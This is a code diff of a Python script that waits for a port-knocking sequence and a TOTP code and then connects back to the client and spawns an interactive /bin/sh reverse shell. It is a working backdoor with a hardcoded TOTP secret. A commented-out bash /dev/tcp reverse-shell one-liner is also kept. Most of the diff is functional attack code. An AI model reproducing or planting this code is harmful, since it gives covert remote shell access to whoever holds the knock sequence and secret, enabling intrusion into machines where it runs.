@@ -7,47 +7,71 @@ import socket
 import subprocess
 import os
 
-my_socket = psocket.SocketHndl(iface_name=None)
-ports = [1337, 1338, 1339]
-current_port = current_time = 0
-timeout = 5
 
-while (current_port < len(ports)):
-  bts = my_socket.recv()
-  pkt = ethernet.Ethernet(bts)
+def port_knocking(ports, timeout):
+  """ Monitor connections on specific ports, if the Port Knocking is completed ... """
 
-  if ((pkt[tcp.TCP] is not None) and (pkt[tcp.TCP]).dport == ports[current_port]): 
-    if ((current_port != 0) and (time() - current_time > timeout)):
-      current_port = current_time = 0
-    else:
-      print ("Recebeu!")
-      current_port += 1
-      current_time = time()
+  my_socket = psocket.SocketHndl(iface_name=None)
+  current_port = current_time = 0
 
+  while (current_port < len(ports)):
+    bts = my_socket.recv()
+    pkt = ethernet.Ethernet(bts)
 
-serv_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-serv_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
-serv_socket.bind(('127.0.0.1', 1340)) 
-serv_socket.listen(10) 
-con, cliente = serv_socket.accept() 
-client_value = con.recv(1024).decode().strip()
-serv_socket.close() 
-
-totp = pyotp.TOTP('2UZC3V2WGD2OHNDP')
-if (totp.verify(client_value)):
-  print("Aceito!")
-else:
-  print("Rejeitado!")
+    if ((pkt[tcp.TCP] is not None) and (pkt[tcp.TCP]).dport == ports[current_port]): 
+      if ((current_port != 0) and (time() - current_time > timeout)):
+        current_port = current_time = 0
+      else:
+        print ("Recebeu!")
+        current_port += 1
+        current_time = time()
 
 
-#command = "bash -i >& /dev/tcp" + cliente[0] + "/12345 0>&1"
-#subprocess.run(command.split(), shell = True, check = True) 
+def check_OTP(port_otp):
+  """ Open specific port to receive OTP password """
 
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
-s.connect((cliente[0], 12345))
-os.dup2(s.fileno(),0)
-os.dup2(s.fileno(),1) 
-os.dup2(s.fileno(),2)
-subprocess.call(["/bin/sh","-i"])
+  serv_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  serv_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
+  serv_socket.bind(('127.0.0.1', port_otp)) 
+  serv_socket.listen(1) 
+  con, client = serv_socket.accept() 
+  client_value = con.recv(1024).decode().strip()
+  serv_socket.close() 
 
+  totp = pyotp.TOTP('2UZC3V2WGD2OHNDP')
+  if (totp.verify(client_value)):
+    print("Aceito!")
+    return client[0]
+  else:
+    print("Rejeitado!")
+
+
+def reverse_shell(client_ip, port_reverse_shell):
+  """ Send shell do client """
+
+  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+  s.connect((client_ip, port_reverse_shell))
+  os.dup2(s.fileno(),0)
+  os.dup2(s.fileno(),1) 
+  os.dup2(s.fileno(),2)
+  subprocess.call(["/bin/sh","-i"])
+
+  # command = "bash -i >& /dev/tcp" + cliente[0] + "/12345 0>&1"
+  # subprocess.run(command.split(), shell = True, check = True) 
+
+
+if __name__ == '__main__':
+  while 1:
+    try:
+      ports_list = [int(x) for x in input("Type ports sequence (e.g. 12345 1337 5000): ").split()]
+      timeout = int(input("Timeout (in seconds) between each port connection: "))
+      port_otp = int(input("Type the port that will receive the OTP value: "))
+      port_reverse_shell = int(input("Type the port that will receive the reverse shell: "))
+      break
+    except ValueError:
+      print ("\nERROR! Type correct port numbers!")
+
+  port_knocking(ports_list, timeout)
+  client_ip = check_OTP(port_otp)
+  reverse_shell(client_ip, port_reverse_shell)
 
